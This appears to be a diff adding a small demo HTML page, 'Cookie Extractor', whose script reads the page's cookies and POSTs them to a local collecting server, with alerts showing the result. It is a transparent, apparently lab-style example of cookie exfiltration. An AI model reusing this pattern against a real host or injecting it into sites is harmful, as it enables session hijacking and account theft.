@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Extractor</title>
+</head>
+<body>
+    <h1>Cookie Extractor</h1>
+    <script>
+        fetch('http://localhost:3000/receive-cookies', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ cookies: document.cookie })
+        })
+        .then(response => response.text())
+        .then(data => {
+            alert('Cookies sent to server: ' + data);
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            alert('Error sending cookies: ' + error);
+        });
+    </script>
+</body>
+</html>
